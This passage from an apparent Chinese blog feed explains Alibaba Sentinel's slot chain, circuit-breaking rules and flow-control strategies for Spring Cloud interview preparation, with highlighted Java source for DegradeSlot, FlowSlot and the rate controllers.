class="doctag">@param</span> prioritized     whether the entry is prioritized</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args            parameters of the original call</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Throwable blocked exception or unexpected error</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">fireEntry</span><span class="params">(Context context, ResourceWrapper resourceWrapper, Object obj, <span class="type">int</span> count, <span class="type">boolean</span> prioritized,</span></span><br><span class="line"><span class="params">                   Object... args)</span> <span class="keyword">throws</span> Throwable;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Exit of this slot.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> context         current &#123;<span class="doctag">@link</span> Context&#125;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> resourceWrapper current resource</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> count           tokens needed</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args            parameters of the original call</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">exit</span><span class="params">(Context context, ResourceWrapper resourceWrapper, <span class="type">int</span> count, Object... args)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Means finish of &#123;<span class="doctag">@link</span> #exit(Context, ResourceWrapper, int, Object...)&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> context         current &#123;<span class="doctag">@link</span> Context&#125;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> resourceWrapper current resource</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> count           tokens needed</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args            parameters of the original call</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">fireExit</span><span class="params">(Context context, ResourceWrapper resourceWrapper, <span class="type">int</span> count, Object... args)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总体的框架如下:</p><p><img src="/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/3.png" alt="结构图"></p><p>Sentinel 将 SlotChainBuilder 作为 SPI 接口进行扩展，使得 Slot Chain 具备了扩展的能力。您可以自行加入自定义的 slot 并编排 slot 间的顺序，从而可以给 Sentinel 添加自定义的功能。</p><p><img src="/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/4.png" alt="Sentinel图"></p><h4 id="RuleManager-规则管理器"><a href="#RuleManager-规则管理器" class="headerlink" title="RuleManager 规则管理器"></a>RuleManager 规则管理器</h4><p>每个 Slot 插槽背后都对应着一个 RuleManager 的实现类，简单理解就是每个 Slot 有一套规则，规则验证处理由对应的 RuleManager 来进行处理。</p><p>流量控制：FlowSolt 对应 FlowRuleManager</p><p>降级控制：DegradeSlot  对应 DegradeRuleManager</p><p>权限控制：AuthoritySlot 对应 AuthorityRuleManager</p><p>系统规则控制： SystemSlot 对应 SystemRuleManager</p><h4 id="降级控制实现原理"><a href="#降级控制实现原理" class="headerlink" title="降级控制实现原理"></a>降级控制实现原理</h4><ol><li>新增资源配置降级规则，目前对于降级策有如下三种：</li></ol><p>RT：平均响应时间 (DEGRADE_GRADE_RT)：当 1s 内持续进入 5 个请求，对应时刻的平均响应时间（秒级）均超过阈值（count，以 ms 为单位），那么在接下的时间窗口（DegradeRule 中的 timeWindow，以 s 为单位）之内，对这个方法的调用都会自动地熔断（抛出 DegradeException）。注意 Sentinel 默认统计的 RT 上限是 4900 ms，超出此阈值的都会算作 4900 ms，若需要变更此上限可以通过启动配置项 -Dcsp.sentinel.statistic.max.rt&#x3D;xxx 来配置。</p><p><img src="/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/5.png" alt="平均响应图"></p><p>异常比例：当资源的每秒请求量 &gt;&#x3D; 5，并且每秒异常总数占通过量的比值超过阈值（DegradeRule 中的 count）之后，资源进入降级状态，即在接下的时间窗口（DegradeRule 中的 timeWindow，以 s 为单位）之内，对这个方法的调用都会自动地返回。异常比率的阈值范围是 [0.0, 1.0]，代表 0% - 100%。</p><p><img src="/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/6.png" alt="异常比例图"></p><p>异常数：当资源近 1 分钟的异常数目超过阈值之后会进行熔断。注意由于统计时间窗口是分钟级别的，若 timeWindow 小于 60s，则结束熔断状态后仍可能再进入熔断状态。</p><p><img src="/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/7.png" alt="异常数图"></p><p>限流结果信息</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Blocked by Sentinel (flow limiting)</span><br></pre></td></tr></table></figure><ol start="2"><li>实现逻辑</li></ol><p>在之前我们已经提及 Sentinel 是通过 slot 链来实现的，对于降级功能其提供了 DegradeSlot，实现源码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DegradeSlot</span> <span class="keyword">extends</span> <span class="title class_">AbstractLinkedProcessorSlot</span>&lt;DefaultNode&gt; &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">entry</span><span class="params">(Context context, ResourceWrapper resourceWrapper, DefaultNode node, <span class="type">int</span> count, <span class="type">boolean</span> prioritized, Object... args)</span></span><br><span class="line">        <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        DegradeRuleManager.checkDegrade(resourceWrapper, context, node, count);</span><br><span class="line">        fireEntry(context, resourceWrapper, node, count, prioritized, args);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exit</span><span class="params">(Context context, ResourceWrapper resourceWrapper, <span class="type">int</span> count, Object... args)</span> &#123;</span><br><span class="line">        fireExit(context, resourceWrapper, count, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上面代码我们可以了解到，限流规则的实现是在 DegradeRuleManager 的checkDegrade中来处理的，限流可以-配置多个规则，依次按照规则来处理。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">checkDegrade</span><span class="params">(ResourceWrapper resource, Context context, DefaultNode node, <span class="type">int</span> count)</span></span><br><span class="line">        <span class="keyword">throws</span> BlockException &#123;</span><br><span class="line"> </span><br><span class="line">        Set&lt;DegradeRule&gt; rules = degradeRules.get(resource.getName());</span><br><span class="line">        <span class="keyword">if</span> (rules == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (DegradeRule rule : rules) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!rule.passCheck(context, node, count)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">DegradeException</span>(rule.getLimitApp(), rule);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在 DegradeRule 的 passCheck 方法中我们可以看到可以根据 RT、异常数和异常比例来进行熔断降级处理。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">passCheck</span><span class="params">(Context context, DefaultNode node, <span class="type">int</span> acquireCount, Object... args)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (cut.get()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="type">ClusterNode</span> <span class="variable">clusterNode</span> <span class="operator">=</span> ClusterBuilderSlot.getClusterNode(<span class="built_in">this</span>.getResource());</span><br><span class="line">        <span class="keyword">if</span> (clusterNode == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 请求处理时间</span></span><br><span class="line">        <span class="keyword">if</span> (grade == RuleConstant.DEGRADE_GRADE_RT) &#123;</span><br><span class="line">            <span class="type">double</span> <span class="variable">rt</span> <span class="operator">=</span> clusterNode.avgRt();</span><br><span class="line">            <span class="keyword">if</span> (rt &lt; <span class="built_in">this</span>.count) &#123;</span><br><span class="line">                passCount.set(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// Sentinel will degrade the service only if count exceeds.</span></span><br><span class="line">            <span class="keyword">if</span> (passCount.incrementAndGet() &lt; rtSlowRequestAmount) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (grade == RuleConstant.DEGRADE_GRADE_EXCEPTION_RATIO) &#123;</span><br><span class="line"><span class="comment">//异常比例</span></span><br><span class="line">            <span class="type">double</span> <span class="variable">exception</span> <span class="operator">=</span> clusterNode.exceptionQps();</span><br><span class="line">            <span class="type">double</span> <span class="variable">success</span> <span class="operator">=</span> clusterNode.successQps();</span><br><span class="line">            <span class="type">double</span> <span class="variable">total</span> <span class="operator">=</span> clusterNode.totalQps();</span><br><span class="line">            <span class="comment">// If total amount is less than minRequestAmount, the request will pass.</span></span><br><span class="line">            <span class="keyword">if</span> (total &lt; minRequestAmount) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// In the same aligned statistic time window,</span></span><br><span class="line">            <span class="comment">// &quot;success&quot; (aka. completed count) = exception count + non-exception count (realSuccess)</span></span><br><span class="line">            <span class="type">double</span> <span class="variable">realSuccess</span> <span class="operator">=</span> success - exception;</span><br><span class="line">            <span class="keyword">if</span> (realSuccess &lt;= <span class="number">0</span> &amp;&amp; exception &lt; minRequestAmount) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (exception / success &lt; count) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (grade == RuleConstant.DEGRADE_GRADE_EXCEPTION_COUNT) &#123;</span><br><span class="line"><span class="comment">//异常数</span></span><br><span class="line">            <span class="type">double</span> <span class="variable">exception</span> <span class="operator">=</span> clusterNode.totalException();</span><br><span class="line">            <span class="keyword">if</span> (exception &lt; count) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (cut.compareAndSet(<span class="literal">false</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">            <span class="type">ResetTask</span> <span class="variable">resetTask</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResetTask</span>(<span class="built_in">this</span>);</span><br><span class="line">            pool.schedule(resetTask, timeWindow, TimeUnit.SECONDS);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="流量控制实现原理"><a href="#流量控制实现原理" class="headerlink" title="流量控制实现原理"></a>流量控制实现原理</h4><p>接下来我们了解学习一下 Sentinel 是如何实现流量控制的</p><p>流量控制（flow control），其原理是监控应用流量的 QPS 或并发线程数等指标，当达到指定的阈值时对流量进行控制，以避免被瞬时的流量高峰冲垮，从而保障应用的高可用性。</p><p>FlowSlot 会根据预设的规则，结合前面 NodeSelectorSlot、ClusterNodeBuilderSlot、StatisticSlot 统计出来的实时信息进行流量控制。</p><p>限流的直接表现是在执行 Entry nodeA &#x3D; SphU.entry(resourceName) 的时候抛出 FlowException 异常。FlowException 是 BlockException 的子类，您可以捕捉 BlockException 来自定义被限流之后的处理逻辑。</p><p>同一个资源可以创建多条限流规则。FlowSlot 会对该资源的所有限流规则依次遍历，直到有规则触发限流或者所有规则遍历完毕。</p><p>一条限流规则主要由下面几个因素组成，我们可以组合这些元素来实现不同的限流效果：</p><ul><li>resource：资源名，即限流规则的作用对象</li><li>count: 限流阈值</li><li>grade: 限流阈值类型（QPS 或并发线程数）</li><li>limitApp: 流控针对的调用来源，若为 default 则不区分调用来源</li><li>strategy: 调用关系限流策略</li><li>controlBehavior: 流量控制效果（直接拒绝、Warm Up、匀速排队）</li></ul><p>流控-QPS配置</p><p><img src="/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/8.png" alt="QPS配置图"></p><p>流控-线程数配置</p><p><img src="/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/9.png" alt="流控图"></p><h5 id="实现流程"><a href="#实现流程" class="headerlink" title="实现流程"></a>实现流程</h5><p>Sentinel 提供了 FlowSlot 用来进行流量控制，流量规则的最终实现在 FlowRuleChecker 的 checkFlow 中实现的。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlowSlot</span> <span class="keyword">extends</span> <span class="title class_">AbstractLinkedProcessorSlot</span>&lt;DefaultNode&gt; &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> FlowRuleChecker checker;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FlowSlot</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(<span class="keyword">new</span> <span class="title class_">FlowRuleChecker</span>());</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Package-private for test.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> checker flow rule checker</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span> 1.6.1</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    FlowSlot(FlowRuleChecker checker) &#123;</span><br><span class="line">        AssertUtil.notNull(checker, <span class="string">&quot;flow checker should not be null&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.checker = checker;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">entry</span><span class="params">(Context context, ResourceWrapper resourceWrapper, DefaultNode node, <span class="type">int</span> count,</span></span><br><span class="line"><span class="params">                      <span class="type">boolean</span> prioritized, Object... args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        checkFlow(resourceWrapper, context, node, count, prioritized);</span><br><span class="line"> </span><br><span class="line">        fireEntry(context, resourceWrapper, node, count, prioritized, args);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">checkFlow</span><span class="params">(ResourceWrapper resource, Context context, DefaultNode node, <span class="type">int</span> count, <span class="type">boolean</span> prioritized)</span></span><br><span class="line">        <span class="keyword">throws</span> BlockException &#123;</span><br><span class="line">        checker.checkFlow(ruleProvider, resource, context, node, count, prioritized);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exit</span><span class="params">(Context context, ResourceWrapper resourceWrapper, <span class="type">int</span> count, Object... args)</span> &#123;</span><br><span class="line">        fireExit(context, resourceWrapper, count, args);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Function&lt;String, Collection&lt;FlowRule&gt;&gt; ruleProvider = <span class="keyword">new</span> <span class="title class_">Function</span>&lt;String, Collection&lt;FlowRule&gt;&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Collection&lt;FlowRule&gt; <span class="title function_">apply</span><span class="params">(String resource)</span> &#123;</span><br><span class="line">            <span class="comment">// Flow rule map should not be null.</span></span><br><span class="line">            Map&lt;String, List&lt;FlowRule&gt;&gt; flowRules = FlowRuleManager.getFlowRuleMap();</span><br><span class="line">            <span class="keyword">return</span> flowRules.get(resource);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 checkFlow 中会依次获取我们配置的流控规则，然后依次进行流控判断处理，如果被流控则抛出异常 FlowException</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkFlow</span><span class="params">(Function&lt;String, Collection&lt;FlowRule&gt;&gt; ruleProvider, ResourceWrapper resource,</span></span><br><span class="line"><span class="params">                          Context context, DefaultNode node, <span class="type">int</span> count, <span class="type">boolean</span> prioritized)</span> <span class="keyword">throws</span> BlockException &#123;</span><br><span class="line">        <span class="keyword">if</span> (ruleProvider == <span class="literal">null</span> || resource == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Collection&lt;FlowRule&gt; rules = ruleProvider.apply(resource.getName());</span><br><span class="line">        <span class="keyword">if</span> (rules != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (FlowRule rule : rules) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!canPassCheck(rule, context, node, count, prioritized)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FlowException</span>(rule.getLimitApp(), rule);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在 canPassCheck 中会判断是集群限流还是本地限流</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canPassCheck</span><span class="params">(<span class="comment">/*@NonNull*/</span> FlowRule rule, Context context, DefaultNode node, <span class="type">int</span> acquireCount,</span></span><br><span class="line"><span class="params">                                                    <span class="type">boolean</span> prioritized)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">limitApp</span> <span class="operator">=</span> rule.getLimitApp();</span><br><span class="line">        <span class="keyword">if</span> (limitApp == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (rule.isClusterMode()) &#123;</span><br><span class="line">            <span class="keyword">return</span> passClusterCheck(rule, context, node, acquireCount, prioritized);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> passLocalCheck(rule, context, node, acquireCount, prioritized);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果是本地限流则获取节点信息，然后根据流控规则进行流控判断</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">passLocalCheck</span><span class="params">(FlowRule rule, Context context, DefaultNode node, <span class="type">int</span> acquireCount,</span></span><br><span class="line"><span class="params">                                          <span class="type">boolean</span> prioritized)</span> &#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">selectedNode</span> <span class="operator">=</span> selectNodeByRequesterAndStrategy(rule, context, node);</span><br><span class="line">        <span class="keyword">if</span> (selectedNode == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> rule.getRater().canPass(selectedNode, acquireCount, prioritized);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>当 QPS 超过某个阈值的时候，则采取措施进行流量控制。流量控制的手段包括以下几种：直接拒绝、Warm Up、匀速排队。对应 FlowRule 中的 controlBehavior 字段。</p><p>直接拒绝（RuleConstant.CONTROL_BEHAVIOR_DEFAULT）方式是默认的流量控制方式，当QPS超过任意规则的阈值后，新的请求就会被立即拒绝，拒绝方式为抛出FlowException。这种方式适用于对系统处理能力确切已知的情况下，比如通过压测确定了系统的准确水位时。具体的例子参见 FlowQpsDemo。</p><p>Warm Up（RuleConstant.CONTROL_BEHAVIOR_WARM_UP）方式，即预热&#x2F;冷启动方式。当系统长期处于低水位的情况下，当流量突然增加时，直接把系统拉升到高水位可能瞬间把系统压垮。通过”冷启动”，让通过的流量缓慢增加，在一定时间内逐渐增加到阈值上限，给冷系统一个预热的时间，避免冷系统被压垮。详细文档可以参考 流量控制 - Warm Up 文档</p><p>目前 Sentinel 对于流量控制提供了如下几种方式：</p><ul><li>直接拒绝（DefaultController）：支持抛出异常<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canPass</span><span class="params">(Node node, <span class="type">int</span> acquireCount, <span class="type">boolean</span> prioritized)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">curCount</span> <span class="operator">=</span> avgUsedTokens(node);</span><br><span class="line">    <span class="keyword">if</span> (curCount + acquireCount &gt; count) &#123;</span><br><span class="line">        <span class="keyword">if</span> (prioritized &amp;&amp; grade == RuleConstant.FLOW_GRADE_QPS) &#123;</span><br><span class="line">            <span class="type">long</span> currentTime;</span><br><span class="line">            <span class="type">long</span> waitInMs;</span><br><span class="line">            currentTime = TimeUtil.currentTimeMillis();</span><br><span class="line">            waitInMs = node.tryOccupyNext(currentTime, acquireCount, count);</span><br><span class="line">            <span class="keyword">if</span> (waitInMs &lt; OccupyTimeoutProperty.getOccupyTimeout()) &#123;</span><br><span class="line">                node.addWaitingRequest(currentTime + waitInMs, acquireCount);</span><br><span class="line">                node.addOccupiedPass(acquireCount);</span><br><span class="line">                sleep(waitInMs);</span><br><span class="line"> </span><br><span class="line">                <span class="comment">// PriorityWaitException indicates that the request will pass after waiting for &#123;@link @waitInMs&#125;.</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PriorityWaitException</span>(waitInMs);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>匀速排队（RateLimiterController）：判断等待时间，如果等待时间过长也是会限流，并且使用 Thread.sleep 如果配置不正确可能会导致线程过多。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canPass</span><span class="params">(Node node, <span class="type">int</span> acquireCount, <span class="type">boolean</span> prioritized)</span> &#123;</span><br><span class="line">        <span class="comment">// Pass when acquire count is less or equal than 0.</span></span><br><span class="line">        <span class="keyword">if</span> (acquireCount &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Reject when count is less or equal than 0.</span></span><br><span class="line">        <span class="comment">// Otherwise,the costTime will be max of long and waitTime will overflow in some cases.</span></span><br><span class="line">        <span class="keyword">if</span> (count &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="type">long</span> <span class="variable">currentTime</span> <span class="operator">=</span> TimeUtil.currentTimeMillis();</span><br><span class="line">        <span class="comment">// Calculate the interval between every two requests.</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">costTime</span> <span class="operator">=</span> Math.round(<span class="number">1.0</span> * (acquireCount) / count * <span class="number">1000</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Expected pass time of this request.</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">expectedTime</span> <span class="operator">=</span> costTime + latestPassedTime.get();</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (expectedTime &lt;= currentTime) &#123;</span><br><span class="line">            <span class="comment">// Contention may exist here, but it&#x27;s okay.</span></span><br><span class="line">            latestPassedTime.set(currentTime);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Calculate the time to wait.</span></span><br><span class="line">            <span class="type">long</span> <span class="variable">waitTime</span> <span class="operator">=</span> costTime + latestPassedTime.get() - TimeUtil.currentTimeMillis();</span><br><span class="line">            <span class="keyword">if</span> (waitTime &gt; maxQueueingTimeMs) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">oldTime</span> <span class="operator">=</span> latestPassedTime.addAndGet(costTime);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    waitTime = oldTime - TimeUtil.currentTimeMillis();</span><br><span class="line">                    <span class="keyword">if</span> (waitTime &gt; maxQueueingTimeMs) &#123;</span><br><span class="line">                        latestPassedTime.addAndGet(-costTime);</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// in race condition waitTime may &lt;= 0</span></span><br><span class="line">                    <span class="keyword">if</span> (waitTime &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        Thread.sleep(waitTime);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li>Warm Up（WarmUpController 和 WarmUpRateLimiterController）：预热启动<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canPass</span><span class="params">(Node node, <span class="type">int</span> acquireCount, <span class="type">boolean</span> prioritized)</span> &#123;</span><br><span class="line">    <span class="type">long</span> <span class="variable">passQps</span> <span class="operator">=</span> (<span class="type">long</span>) node.passQps();</span><br><span class="line"> </span><br><span class="line">    <span class="type">long</span> <span class="variable">previousQps</span> <span class="operator">=</span> (<span class="type">long</span>) node.previousPassQps();</span><br><span class="line">    syncToken(previousQps);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 开始计算它的斜率</span></span><br><span class="line">    <span class="comment">// 如果进入了警戒线，开始调整他的qps</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">restToken</span> <span class="operator">=</span> storedTokens.get();</span><br><span class="line">    <span class="keyword">if</span> (restToken &gt;= warningToken) &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">aboveToken</span> <span class="operator">=</span> restToken - warningToken;</span><br><span class="line">        <span class="comment">// 消耗的速度要比warning快，但是要比慢</span></span><br><span class="line">        <span class="comment">// current interval = restToken*slope+1/count</span></span><br><span class="line">        <span class="type">double</span> <span class="variable">warningQps</span> <span class="operator">=</span> Math.nextUp(<span class="number">1.0</span> / (aboveToken * slope + <span class="number">1.0</span> / count));</span><br><span class="line">        <span class="keyword">if</span> (passQps + acquireCount &lt;= warningQps) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (passQps + acquireCount &lt;= count) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springcloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>Springmvc最热点面试题</title>
      
      <link href="/2024/05/26/Springmvc%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
      <url>/2024/05/26/Springmvc%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
      
